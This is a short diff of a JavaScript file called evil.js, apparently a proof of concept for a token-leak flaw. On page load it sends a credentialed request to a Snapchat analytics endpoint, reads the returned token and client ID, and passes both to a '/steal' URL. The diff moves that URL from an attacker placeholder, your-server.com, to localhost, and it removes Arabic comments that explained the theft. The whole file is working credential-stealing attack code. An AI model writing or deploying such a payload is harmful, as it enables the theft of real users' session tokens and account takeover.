@@ -1,20 +1,18 @@
 // evil.js
 document.addEventListener('DOMContentLoaded', function() {
-    // إرسال طلب إلى endpoint المعرض للثغرة
     fetch('https://us-central1-gcp.api.snapchat.com/web-analytics/web/init_client', {
         method: 'POST',
-        credentials: 'include'  // إرسال credentials (cookies) مع الطلب
+        credentials: 'include'
     })
     .then(response => response.json())
     .then(data => {
-        // تسريب الـ token إلى سيرفر المهاجم
         const token = data.token;
         const cid = data.cid;
         
-        // إرسال الـ token و الـ CID إلى سيرفر المهاجم (استبدل your-server.com بسيرفرك)
-        fetch('https://your-server.com/steal?token=' + token + '&cid=' + cid, {
+        // ارسل إلى الخادم المحلي على port 8000
+        fetch('http://localhost:8000/steal?token=' + token + '&cid=' + cid, {
             method: 'GET',
-            mode: 'no-cors'  // لتجنب مشاكل CORS عند الإرسال إلى سيرفر خارجي
+            mode: 'no-cors'
         })
         .then(() => {
             console.log('Token stolen successfully: ' + token);
